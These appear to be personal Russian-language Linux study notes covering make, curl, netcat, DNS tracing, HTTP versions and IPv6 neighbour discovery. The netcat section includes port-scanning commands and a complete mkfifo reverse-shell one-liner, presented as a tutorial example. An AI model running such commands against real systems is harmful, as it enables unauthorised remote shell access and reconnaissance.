 все что ей нужно — получить реквизит hello. Зная о рекурсивной природе make,
  не сложно предположить как будет работать этот скрипт.  
Т ак же следует обратить особое внимание на то, что если файл hello уже имеется 
 (остался после предыдущей компиляции) и его реквизиты не были изменены, 
 то команда make ничего не станет пересобирать. 
Это классические грабли make. Так например, изменив заголовочный файл, случайно 
  не включенный в список реквизитов, можно получить долгие часы головной боли.  
 Поэтому, чтобы гарантированно полностью пересобрать проект, нужно предварительно  
 очистить рабочий каталог:
	$ make clean
	$ make
Для выполнения целей install/uninstall вам потребуются использовать sudo.

МОЙ make файл /home/oem/dirformake/makefile

TARG_DIR = /tmp/  #объявление перемнной пути
TARG_DIR = /tmp/
.PHONY: all prtall clean unarx_f

all:    prtall  prt_md # выполнить 2 псевдоцели
clean:
        rm -f md.dat arx.tar arx_f.tar
prtall: f1 f2 f3
        cat f1
        cat f2
        cat f3
prt_md: $(wildcard *.md) 
        cat *.md
md.dat: $(wildcard *.md) #при изменении хотя бы одного ф-ла .md печать ws от ВСЕХ в md.dat
        wc *.md >> md.dat
md2.dat:$(wildcard *.md) #при изменении ф-лов .md печать ws от ТОЛЬКО ОТ ЭТИХ ф-лов в md.dat
        wc $? >> md2.dat 
arx.ar: $(wildcard *.md)
        ar r arx.ar $?  #при изменении ф-лов .md добавление в архив ТОЛЬКО ОТ ЭТИХ ф-лов в md.dat
arx.tar:$(wildcard *.md) md.dat
        tar czvf arx.tar *.md md.dat
arx_f.tar:$(wildcard f*)
        tar czvf arx_f.tar f* #при изменении хотя бы одного ф-ла f* добавл-е ВСЕХ в файлов в архив
unarx_f:arx_f.tar
        tar xvf arx_f.tar -C  $(TARG_DIR)
Цели:
unarx_f:arx_f.tar // цель-команда, зависящая от состояния/наличия arx_f.tar	
arx.tar:$(wildcard *.md) md.dat - цель-файл, зависящий от состояний файлов *.md и файла md.dat
md.dat: $(wildcard *.md) // цель зависит от файлов *.md, при добавлении нового,удалении,
        wc *.md >> md.dat //изменении запуститься цель команда цели " wc *.md >> md.dat"
                         // Если изменений не было, выдасть 
        $(wildcard *.md) - внутрення конструкция make - Получить список всех файлов с .md

$(TARG_DIR) - обращение в внутреннему псевдониму make см https://rus-linux.net/nlib.php?name=/MyLDP/algol/gnu_make/gnu_make_3-79_russian_manual.html#SEC25
$make md.dat
make: «md.dat» не требует обновления.

! "вложенные" ! зависимости - если удалить md.dat и запустить цель "make arx.tar", то make, не
  обнаружив в наличии md.dat, запустит автоматом цель "md.dat"
$make arx.tar
wc *.md >> md.dat
tar czvf arx.tar *.md md.dat
one.md
two.md
md.dat
если не будет существовать arx_f.tar и запустить цель "make unarx_f", то make, не
  обнаружив в наличии arx_f.tar, запустит автоматом цель "arx_f.tar" сделает архив, 
   а затем его распакует
$ make unarx_f //
tar czvf arx_f.tar f*
f1
f2
tar xvf arx_f.tar -C  /tmp/
f1
f2



 = = HTTP утилиты curl telnet nc wget = =
https://curl.se/docs/httpscripting.html  The Art Of Scripting HTTP Requests Using Curl
Искусство написания сценариев HTTP-запросов с помощью curl
видео https://www.youtube.com/watch?v=uxoGYIWCQZg&list=PLXR11-5Ez3irR9J3dlEqtuCplYzy2cwdD&index=16 
  csc Равиль Введение в Linux, лекция "HTTP"
HTTP 1.1 1997
pipeline - возможность отправть 2й запрос пока 1й получает ответ
В заголовки добавлены Host(обязательный), Connection: keep-alive, Content-Encoding
Добавлены методы к GET POST, PUT DELETE PATCH
"Сервисы" в REST - аналоги "программ Linux",  обращение к ним http://path/to/metode1


telnet localhost 80  // соединение c apache через telnet
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
GET /index.html // запросить стартовую страницу с apache
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
.....

nc -C 192.168.100.5 80 //без -С не работает!соединение web-серверу через nc,  
                      // выполнить метод GET корневой страницы 192.168.100.5 
GET /
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
....

curl -I beltelecom.by // запросить у сервера только заголовки HTTP
HTTP/1.1 301 Moved Permanently // ресурс перемещен, адрес см ниже. Браузер автоматом перезагрузит ресурс с https://beltelecom.by/
Server: nginx
Date: Tue, 03 Oct 2023 20:34:56 GMT
Content-Type: text/html
Content-Length: 178
Connection: keep-alive
Location: https://beltelecom.by/

 = = = КУКИ cookie  = = = 
фрагмент данных (для идентификации web-клиента на web-сервере), отправленный веб-сервером 
 и хранимый на компьютере пользователя.веб-браузер при попытке открыть страницу сайта пересылает этот фрагмент данных веб-серверу в составе HTTP-запроса.
Используется для[1]:аутентификации пользователя; хранения персональных предпочтений и настроек пользователя; отслеживания состояния сеанса доступа пользователя;
хранения сведений статистики о пользователях.
curl -i ya.ru // запросить у сервера  заголовки HTTP, включить в тело запроса
HTTP/1.1 301 Moved permanently
Accept-CH: Sec-CH-UA-Platform-Version, Sec-CH-UA-Mobile, Sec-CH-UA-Model, Sec-CH-UA, Sec-CH-UA-Full-Version-List, Sec-CH-UA-WoW64, Sec-CH-UA-Arch, Sec-CH-UA-Bitness, Sec-CH-UA-Platform, Sec-CH-UA-Full-Version, Viewport-Width, DPR, Device-Memory, RTT, Downlink, ECT
Cache-Control: max-age=1209600,private
Date: Tue, 03 Oct 2023 20:30:00 GMT
Location: https://ya.ru/
NEL: {"report_to": "network-errors", "max_age": 100, "success_fraction": 0.001, "failure_fraction": 0.1}
P3P: policyref="/w3c/p3p.xml", CP="NON DSP ADM DEV PSD IVDo OUR IND STP PHY PRE NAV UNI"
Portal: Home
Report-To: { "group": "network-errors", "max_age": 100, "endpoints": [{"url": "https://dr.yandex.net/nel", "priority": 1}, {"url": "https://dr2.yandex.net/nel", "priority": 2}]}
Transfer-Encoding: chunked
X-Content-Type-Options: nosniff
X-Yandex-Req-Id: 1696365000788758-5220337030560168349-balancer-l7leveler-kubr-yp-vla-121-BAL-5771
set-cookie: is_gdpr=0; Path=/; Domain=.ya.ru; Expires=Thu, 02 Oct 2025 20:30:00 GMT
set-cookie: is_gdpr_b=CJbqDxD/0QEoAg==; Path=/; Domain=.ya.ru; Expires=Thu, 02 Oct 2025 20:30:00 GMT
set-cookie: _yasc=rKgr2YWQinJ7srhYjZyXMZqNbjKJXFgrTzTFnV7oaYhF7UOKj2ClkGXbLbPY0AK27Dg=; domain=.ya.ru; path=/; expires=Fri, 30 Sep 2033 20:30:00 GMT; secure
// данные в куки, сам броузер решает,как будет хранить (отдельные файлы, один файл....)

wget -vS  https://beltelecom.by/private // сохранить страницу 




https://www.youtube.com/watch?v=N8S23UrGv20 чейз
https://ru.widsmob.com/tips/record-streaming-audio.html?ysclid=lkipdu851826119251

ЗАДАЧИ НА БУДУЩЕЕ ИЗУЧИТЬ
0) стоп ! файлы журналов телефон
1) DNS  настроить 2 сервера первич и вторич!!
2) https://ru.wikipedia.org/wiki/Simple_Service_Discovery_Protocol ssdp
3) пример последоват команд для обновления файла описания пакетов  /var/lib/dpkg/available утилиты dpkg
        avail=$(mktemp) // создать  временный  файл и передать его имя переменной  avail
        apt-cache dumpavail> "$avail"//записатиь в файл с именем $avail все содерж кэша из репозитариев (>81Mбайт)
        dpkg --merge-avail "$avail" // загрузить данные из файла с именем $avail  в /var/lib/dpkg/available
        rm "$avail"
Вместо " avail=$(mktemp)" можно использовать  file_tmp1=$(touch /tmp/filetmp1;echo '/tmp/filetmp1')
написать скрипт
4)https://losst.pro/ustanovka-docker-v-debian-11
5) samba - на работе доделать!!!! + кетов видео посмотреть Протокол SMB и (standalone) файловый CIFS-сервер.mp4
6) chroot
7) apache2 настроить пользователей и сертификаты
7.1) ffdisk echo_write

8) selinux  https://losst.pro/nastrojka-selinux  tomoyo Самоучитель системного администратора Linux ( PDFDrive ).pdf 
   selinux - система безопасности
    ps -Z (man ps " Z      Add a column of security data.  Identical to -M (for SELinux).")
       chcon - change file security context

9) iptables -L
10) квотирование резервирование дисков кетов - РЕАЛИЗОВАТЬ
11) D-Bus
https://losst.pro/chto-takoe-dbus  что такое шина d-bus
https://ru.wikipedia.org/wiki/D-Bus
https://habr.com/ru/articles/529966/
12) /usr/bin/neofetch
13)  = = = cut tr = = =  доизучать

14) скриты пайтон
15)https://losst.pro/argumenty-komandnoj-stroki-bash
https://routerus.com/bash-concatenate-strings/?ysclid=lm6sm4l6yy712964312
16) передача по конв-ру https://habr.com/ru/articles/195152/
strace -f bash -c ‘/bin/echo foo | grep bar’
17) make https://habr.com/ru/articles/211751/ - done
18) https://losst.pro/?s=docker
18.1) docker -контейнер см https://www.sitespeed.io/  
npm Install sitespeed.io globally:
docker run --rm -v "$(pwd):/sitespeed.io" sitespeedio/sitespeed.io:29.8.0 https://www.sitespeed.io/
https://habr.com/ru/companies/badoo/articles/329722/
  Замер производительности Server Push
 Измерение эффекта любого повышения производительности требует хорошего инструмента тестирования. Sitespeed.io – отличный инструмент, доступный через npm; он автоматизирует тестирование страниц и собирает ценные показатели производительности.
19) cgroups +KVM deb-book
cgroups https://ru.wikipedia.org/wiki/%D0%9A%D0%BE%D0%BD%D1%82%D1%80%D0%BE%D0%BB%D1%8C%D0%BD%D0%B0%D1%8F_%D0%B3%D1%80%D1%83%D0%BF%D0%BF%D0%B0_(Linux)
cgroups https://habr.com/ru/companies/selectel/articles/303190/
 https://debian-handbook.info/browse/ru-RU/stable/unix-services.html#sect.systemd
21) Сбор и анализ логов в Linux  https://habr.com/ru/companies/otus/articles/714266/
22) rsync книга 12.2.1 между 2мя вирт машинами
23) https://curl.se/docs/httpscripting.html  The Art Of Scripting HTTP Requests Using Curl
Искусство написания сценариев HTTP-запросов с помощью curl
24) книга Debian: 9.8. Планирование асинхронных задач: anacron   9.10. Резервное копирование 9.10.1. Резервное копирование с помощью rsync
25) VM клон клон - создать LVM диски на основке LVM 25 Основы GNU + RAID 26 Основы GNU
26) Вынести home папку - создать LVM диски на основке LVM 23 Основы GNU 
27) Кетов видео "SSH_ Протокол удаленного защищенного доступа.mp4" настроить аутентификацию по ключу в ssh


 = = =English = = =
подход "work around" - дословно "обойти", подход решения проблемы в виде "костыля"/обходного пути, 
  закрывающей ее последствия
подход "fix" - дословно "обойти", подход решения проблемы в виде устранения причины проблемы
I am in a car I am on a bas ("in" когда  находишься там, где нельзя всть и пройтись, "on" - когда можно ) 
 = = =end English = = =


Дочитать 
книга sobel введение в perl + bash sh
Linux Колис-ко. От новичка к профессионалу ( PDFDrive )2016.pdf  22.3. Система инициализации systemd 

HTTP/1.1 vs HTTP/2 vs HTTP/3
https://www.8host.com/blog/v-chem-raznica-mezhdu-http1-1-i-http2/
https://habr.com/ru/companies/badoo/articles/329722/ -подробно про serverpush
HTTP/1.1 разработан в 1989 году 
В этом процессе клиент отправляет текстовые запросы на сервер в рамках разных TCP соединений,
  вызывая методы GET PUT,POST - создать ресурс/отправить на сервер данные,
  PATCH-изменить ресурс,HEAD - запрос только заголовков
В HTTP/1.1 для загрузки каждого элемента ресурса страницы (текста html, любой картинки, js,
  css) ПОСЛЕДОВАТЕЛЬНО  будет  запущено отдельное TCP соединение.
2
В HTTP/2 (протокол SPDY, разработанный в основном в Google с целью снижения задержки загрузки
  веб-страниц такими методами, как сжатие, мультиплексирование и приоритизация. )
  header и body заголовки и тело HTTP сообщений сжимаются!
  для загрузки ВСЕХ элементов ресурса страницы (текста html, любой картинки, js, css) будет
  запущено ОДНО TCP соединение, каждый элемент будет передаваться в отдельном потоке/stream. 
  Потоки TCP могут организовываться и выполняться параллельно!
 В  отличие от HTTP/1.1, в котором все запросы и ответы хранятся в текстовом формате, 
 HTTP/2 использует двоичный уровень кадрирования для инкапсуляции всех сообщений в ДВОИЧНОМ
 формате,при этом сохраняя семантику HTTP (методы, заголовки). API прикладного уровня 
 по-прежнему создает сообщения в текстовых форматах HTTP, но нижележащий уровень преобразовывает эти
 сообщения в двоичные +Механизм  Server Push: HTTP/2 Server Push is an optional feature of the HTTP/2 and HTTP/3 network
  protocols that allows servers to send resources to a client before the client requests them.
 Server Push is a performance technique aimed at reducing latency by loading resources
 "Пусть есть веб-сайт, где страницы полагаются на стили, определённые во внешней таблице стилей именем styles.css.
  Когда пользователь запрашивает index.html с сервера, мы можем отправить styles.css сразу после 
  того, как начнём отправлять ответ для index.html, не дожидаясь запроса styles.css"
 Для сервера Apache настройки  Server Push (через файл httpd.conf или .htaccess apache2.conf) для проталкивания таблицы стилей всякий раз, когда запрашивается файл HTML:
   <FilesMatch "\.html$">  Header set Link "</css/styles.css>; rel=preload; as=style"  <FilesMatch>

В HTTP/3 для загрузки ВСЕХ элементов ресурса страницы (текста html, любой картинки, js, css) 
  используется QUIC поверх UDP вместо одного TCP соединения как в  HTTP/2
  О  QUIC читай Eng-wiki! https://en.wikipedia.org/wiki/QUIC
СТОП 23:51 10/8/2023
REST - подход к построению API, нет единого стандарта, реализует CRUD(мехнизм обработки запросов к БД  создать/прочитать/обновить/удалить) в www
CRUD (В SQL операциям соответствуют операторы Insert (создание записей), Select (чтение записей), Update (редактирование записей), Delete (удаление записей).
В системах, реализующих доступ к БД через API в стиле REST, функции реализуются зачастую (но не обязательно) через HTTP-методы
  PUT, POST, GET, PATCH, DELETE.

Хотя традиционно оперирование в стиле CRUD применяется к базам данных, такой подход может быть распространён на любые хранимые вычислительные сущности (файлы, структуры в памяти, объекты).
Ketov - урок HTTP/apache 

dig +trace byfly.by СТОП

; <<>> DiG 9.18.1-1ubuntu1.2-Ubuntu <<>> +trace byfly.by
;; global options: +cmd
.                       7172    IN      NS      g.root-servers.net.
.                       7172    IN      NS      i.root-servers.net.
.                       7172    IN      NS      h.root-servers.net.
.                       7172    IN      NS      l.root-servers.net.
.                       7172    IN      NS      d.root-servers.net.
.                       7172    IN      NS      b.root-servers.net.
.                       7172    IN      NS      e.root-servers.net.
.                       7172    IN      NS      a.root-servers.net.
.                       7172    IN      NS      c.root-servers.net.
.                       7172    IN      NS      m.root-servers.net.
.                       7172    IN      NS      f.root-servers.net.
.                       7172    IN      NS      k.root-servers.net.
.                       7172    IN      NS      j.root-servers.net.
;; Received 503 bytes from 127.0.0.53#53(127.0.0.53) in 0 ms

by.                     172800  IN      NS      dns1.tld.becloudby.com.
by.                     172800  IN      NS      dns2.tld.becloudby.com.
by.                     172800  IN      NS      dns3.tld.becloudby.com.
by.                     172800  IN      NS      dns4.tld.becloudby.com.
by.                     172800  IN      NS      dns7.tld.becloudby.com.
by.                     86400   IN      DS      495 13 2 2D14284F8E47B53F839BD8068D438680B4B6C7A645769C9D89B47DF0 C5359B7B
by.                     86400   IN      RRSIG   DS 8 1 86400 20231021170000 20231008160000 46780 . DFnRLd65vNJv7QNPPqjkiRYh0BKGoeQuVy/LQa2fQewhOlzJCtPLEwlu JBuPMNOKCm0flYizF8lwafI7FOveG64kXm29DvtuVf8uQ0qphpdyvRwo sByjEnG65gn6Gzg6FvVF55YvcBKHC8CzT+eEY1EkbvJrPH/LQfkjmxc8 56/MvV3AyBYKxAIOQqv8NahoeDJsDRAKI7/OA6HVdCGbRUueFfrQH3zx gncx9MSN1sgdG2oMMqIo/OZIAusuA8medFeXp7RseOg4i17rCf+DbHI1 61KPzE5Nd+h8/cbv+HydAslPho2FypudGEmZYCFVBWr6GiZLi5TiAESg HMUl+w==
;; Received 676 bytes from 192.58.128.30#53(j.root-servers.net) in 39 ms

byfly.by.               3600    IN      NS      ns1.datacenter.by.
byfly.by.               3600    IN      NS      ns2.datacenter.by.
k8hudj30abhl2qii5mfq96qldovb82te.by. 3600 IN NSEC3 1 0 10 BB24315C16913FF7 K8IJK9VOE7DSCTMNLG2R7UTC7V3LIT1T NS
k8hudj30abhl2qii5mfq96qldovb82te.by. 3600 IN RRSIG NSEC3 13 2 3600 20231107194101 20231008194101 11966 by. Wqku3aAoM8A+A+WFlDLbLi0OsVLb9ot7yx5QCGE3xTdsxucbqyEev2Lf HtClA+aJ12rTscLq9YRmERwngxA3CA==
;; Received 296 bytes from 31.44.1.137#53(dns4.tld.becloudby.com) in 31 ms

byfly.by.               3600    IN      A       86.57.251.89
byfly.by.               3600    IN      NS      ns1.datacenter.by.
byfly.by.               3600    IN      NS      ns2.datacenter.by.
;; Received 216 bytes from 86.57.251.14#53(ns2.datacenter.by) in 3 ms

URI= URN,URL 
=URL=  https://ru.wikipedia.org/wiki/URL
URL был разработан как система для максимально естественного указания на !местонахождения! ресурсов в сети.
Локатор должен был быть легко расширяемым и использовать лишь ограниченный набор ASCII‐символов 
(к примеру, в URL никогда не применяется пробел).
В связи с этим возникла следующая традиционная форма записи URL:
<схема>:[//[<логин>[:<пароль>]@]<хост>[:<порт>]][/<URL‐путь>][?<параметры>][#<якорь>]
В этой записи:
"схема" схема обращения к ресурсу; в большинстве случаев имеется в виду сетевой протокол https ssh ftp mailto rtsp telnet...
"логин" имя пользователя, используемое для доступа к ресурсу
"пароль" пароль указанного пользователя
"хост" а)полностью прописанное доменное имя хоста в DNS или b)IP-адрес хоста
"порт" порт хоста для подключения
"URL-путь" уточняющая информация о месте нахождения ресурса; зависит от протокола.
"параметры" строка запроса с передаваемыми на сервер (методом GET) параметрами. Начинается с символа ?, разделитель параметров — знак &. Пример: ?параметр_1=значение_1&параметр_2=значение_2&параметр3=значение_3
"якорь" идентификатор «якоря» с предшествующим символом #. Якорем может быть указан заголовок внутри документа
или атрибут id  (англ.)рус. элемента. По такой ссылке браузер откроет страницу и переместит
 о к указанному элементу. Например, ссылка на этот раздел статьи:
 https://ru.wikipedia.org/wiki/URL#Структура_URL.
=URN=
https://ru.wikipedia.org/wiki/URN
URN указывает неизменное имя ресурса без указания его местонахождения и способа обращения
 (например URN №абонента sip-телефонии, ID-skype и т.д).
В результате URN-имена постоянны, они не зависят от конкретных серверов и протоколов.
Другими словами, URN концептуально обозначает сам ресурс, а не место, где находится ресурса
(а может, уже не находится), как это делает URL. Аналогии человек по имени "Михаил Петров"+URN,
 который живёт в "Москве по адресу ул.Мира, 14"=URL



curl -v localhost 1>/dev/null // получить только заголовки от обмена по HTTP, тело/body передать в dev/null
> GET / HTTP/1.1
> Host: localhost
> User-Agent: curl/7.81.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Sat, 07 Oct 2023 18:10:46 GMT
< Server: Apache/2.4.52 (Ubuntu)
< Last-Modified: Mon, 21 Aug 2023 16:06:36 GMT
< ETag: "29af-60371101ef7ad"
< Accept-Ranges: bytes
< Content-Length: 10671
< Vary: Accept-Encoding
< Content-Type: text/html

 = = = lwp-request алиасы GET POST = = = 
GET -eE -uU 192.168.100.5 | less
GET http://192.168.100.5
User-Agent: lwp-request/6.61 libwww-perl/6.61

200 OK
Connection: close
Date: Sat, 07 Oct 2023 18:20:46 GMT
Accept-Ranges: bytes
ETag: "29af-60371101ef7ad"
Server: Apache/2.4.52 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 10671
Content-Type: text/html
Last-Modified: Mon, 21 Aug 2023 16:06:36 GMT
Client-Date: Sat, 07 Oct 2023 18:20:46 GMT
Client-Peer: 192.168.100.5:80
Client-Response-Num: 1
Title: Apache2 Ubuntu Default Page: It works


 = = =  nc=netcat  = = = 
nc -параметры адрес порт(ы)

Примеры использования nc
1. Проверка порта
Проверка портов 
nc -vz ya.ru 443
Connection to ya.ru (5.255.255.242) 443 port [tcp/https] succeeded!
nc -vz 192.168.31.247 1-1000 2>&1 | grep succeeded
Аналогичным способом можно просканировать порты UDP, добавив параметр -u:
nc -vzu 192.168.31.247 1-1000 2>&1 | grep succeeded
Обращаем ваше внимание на отличие между TCP и UDP. UDP порты всегда доступны.
2. Прослушивание порта
Для того, чтобы прослушивать порт используйте параметр -l.
nc -nlv 8080
Напомним, что при использовании протокола TСP порт должен быть в свободен, в противном случае вы увидите ошибку: Already in use. Также стоит отметить, что не все порты могут использовать обычные пользователи, например, 80 порт (HTTP) мало того, что скорее всего окажется занят другим процессом, так ещё и потребует прав суперпользователя.
3. Чат и обмен файлами
Ещё одной полезной функцией команды nc является обмен данными. 
авайте рассмотрим простейший пример – текстовый чат. Для того, чтобы запустить чат 
на одном компьютере запускаем утилиту в режиме прослушивания порта:
nc -lp 8080
На другом компьютере потребуется указать адрес первого компьютера и тот же самый порт.
Также не забудьте проверить, что порт открыт:
nc 0.0.0.0 8080
Из этого примера видно, что таким способом можно как отправлять, 
так и получать сообщения. Из этого вытекает ещё одно применение команды – обмен файлами. 
Действуем по аналогичному сценарию с тем лишь отличием, что вывод перенаправим в файл, 
в нашем случае paste.txt:
nc -l 8080 > paste.txt
На другом компьютере вводом будет служить файл copy.txt.
 Не лишним будет использовать параметр -N, чтобы после передачи файла закрыть соединение:
nc -N 0.0.0.0 8080 < copy.txt
Для передачи файлов важно соблюсти последовательность, сначала открыть прослушивание и лишь потом отправлять файл.
Команда nc – это вполне рабочий, но далеко не самый лучший способ передачи файлов. Ранее мы рассматривали и другие способы передачи файлов, с ними вы сможете отслеживать прогресс передачи файла, а в ряде случаев даже возобновить процесс.
3. Простой веб-сервер
Так как команда nc работает с протоколом TСP, то c её помощью можно как отправлять,
так и получать запросы HTTP, а это значит, что утилита может стать простейшим веб-сервером.
Конечно, ничего сложнее страницы-заглушки у вас не получится запустить, но зато эта операция 
практически не отнимет времени, к тому же для этого не потребуется что-либо устанавливать.

В нашем примере мы сформируем ответ HTTP с файлом index.html.
Если же говорить о самой команде np, то не лишним будет установить таймер параметром -w 1,
чтобы разорвать соединение, если этого не сделает браузер:

while true; do echo -e "HTTP/1.1 200 OK\n\n$(cat index.html)" | nc -l -w 1 -p 8080; done
Для получения данных с сайта вы можете сформировать запрос и отправить его на советующий адрес и порт.
Но такой способ довольно сложный, поэтому гораздо лучше воспользоваться более подходящей командой curl.

5. Удалённая оболочка
Если вспомнить то, как мы делали чат, может возникнуть ещё одна идея – удалённый доступ к оболочке компьютера. Ранее утилита nc имела несколько параметров для открытия доступа к терминалу. Параметр -e уже давно убрали из утилиты, поэтому простого доступа к терминалу уже не будет. Безопасность самого приложения стала выше, но оно по-прежнему может работать в связке с другими.
Покажем подключение с помощью именованного канала mkfifo.
Но сначала запустим прослушивание порта на том компьютере, на котором будем получать доступ:
nc -lvnp 8080
Теперь перейдём непосредственно к команде для открытия терминала.
Сначала удалим старый именованный канал (rm /tmp/f), на его месте создадим новый (mkfifo /tmp/f), прочитаем его содержимое (cat /tmp/f), а на его вывод отправим команду оболочки (sh -i 2>&1). После этого останется запустить nc с выводом в наш именованный канал (nc 0.0.0.0 8080 >/tmp/f):
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 0.0.0.0 8080 >/tmp/f

 = IPv6 NDP Протокол обнаружения соседей  SLAAC=
https://www.youtube.com/watch?v=e50Xcxeol4E&t
https://www.youtube.com/watch?v=KRAKAAJTxTg
https://www.youtube.com/watch?v=GZTqZQVSY1A
https://www.youtube.com/watch?v=3Gxv7VRa8xQ&t wireshark фильтр для NDP протокол "ICMPv6"

NDP - расширение ICMP для IPv6, его сообшения/типы пакетов ("ICMPv6" в wireshark), задачи:
Обнаружение маршрутизатора
  Router Solicitation/Запрос маршрутизатора (Type 133)
  Router Advertisement/Объявление/Анонос маршрутизатора (Type 134)
Определние локальных адресов
  Neighbor Solicitation (Type 135)
  Neighbor Advertisement (Type 136)
Настройка маршрутизатора
Redirect (Type 137)

Назначение NDP:
1) Обраружение маршрутизатора и префикса IPv6 - автоматическая настройка IPv6, SLAAC 
 (сообщения Router Solicitation/Router Advertisement)
2) Замена ARP для IPv6 (сообщения Neighbor Solicitation/Advertisement)
3) Настройка маршрутизатора
4)Проверка доступности узлов
5) Опредеелние конфликта ip адресов

Получение IPv6 адреса:
A)IPv6 адрес = Префикс IPv6 (64 байта)+ IDинтерфейса (64 байта)
B)Префикс IPv6 - префикс сети (получается хостом  или от DHCPv6-сервера или через SLAAC)
C)IDинтерфейса - индивидуальный адрес IPv6=адрес хоста в сети (получается хостом через:
- UEI-64 (петем высчитывания из MAC, ненадежен тк можно отследить устройство, редко применяется)
- Temporary Addresses - временные адреса IDинтерфейса,по спец алгоритму (Windows10)
- Stable Addresses -  постоянные адреса IDинтерфейса,по спец алгоритму, меняютяс при переходе в др сеть

https://www.youtube.com/watch?v=3Gxv7VRa8xQ wireshark
Получение IPv6 адреса:
1) Настроить статически
2) от DHCPv6-сервера "с сохранением состояния" -> полностью и  индивидуальный адрес IPv6, префикс сети IPv6 и DNS и адрес шлюза/routera
"с сохранением состояния" - значит, что DHCPv6-сервер запоминает выданный IPv6 адресс и отслеживает время его аренды
3) SLAAC — по NDP сообщения RA: информация о префиксе, длине префикса, DNS-серверах, MTU и информация о шлюзе по умолчанию.
4) SLAAC + DHCPv6-сервер "без сохранения состояния"  - наиболее прогрессивный вариант

https://habr.com/ru/articles/254293/
SLAAC — способ, который позволяет хосту получить префикс сети IPv6,DNS-серверах, длину префикса 
 и адрес шлюза по умолчанию от маршрутизатора IPv6 без помощи DHCPv6-сервера по NDP 
 сообщения «Объявления маршрутизатора/Router Advertisement ». !!
DHCPv6-сервер "без сохранения состояния" - сервер выдает только адреса DNS серверов, но не 

windows10: узнать MAC, IPv4 b IPv6 адреса 
ipconfig /all
Ethernet adapter Ethernet 3:
   Description . . . . . . . . . . . : Realtek USB FE Family Controller #2
   Physical Address. . . . . . . . . : 00-E0-4D-3C-AC-C7
Wireless LAN adapter Wi-Fi:
   Description . . . . . . . . . . . : Intel(R) Wi-Fi 6 AX200 160MHz
   Physical Address. . . . . . . . . : EC-63-D7-71-30-F9
   Link-local IPv6 Address . . . . . : fe80::f3c1:13a9:a68a:7ff9%15(Preferred)
   IPv4 Address. . . . . . . . . . . : 192.168.100.6(Preferred)
   Lease Obtained. . . . . . . . . . : Sunday, December 24, 2023 14:26:51
   Default Gateway . . . . . . . . . : fe80::1%15
                                       192.168.100.1
   DHCP Server . . . . . . . . . . . : 192.168.100.1
   DNS Servers . . . . . . . . . . . : fe80::1%15
                                       192.168.100.1
Таблица NDP адресов
netsh in ipv6 show neighbors #windows10
ip -6 neighbor show #linux

= end NDP =



!! шрифт для файла Consolas
для терминалов RGB:60-60-60 цвет фона, цвет шрифта 248-234-188 
Фильтр Захватf wireshark  между 2мя узлами: "host IP1 and host IP2"
Надо понимать, что, по сути, это один из способов взлома, однако, он может быть полезен в том случае, если возникли проблем с ssh. Для того, чтобы предотвратить атаку настраивайте политику безопасности и межсетевой экран
А.Созыкин Анализ Ethernet Wi-fi HTTP NDP DNS SNMP ICMP FTP IMAP POP3 IPv6 и дв wireshark 
https://www.youtube.com/playlist?list=PLtPJ9lKvJ4oiKPQ9GXOvntj44Eu8IGAJK 
markdown конвертер в html https://md2html.vercel.app/
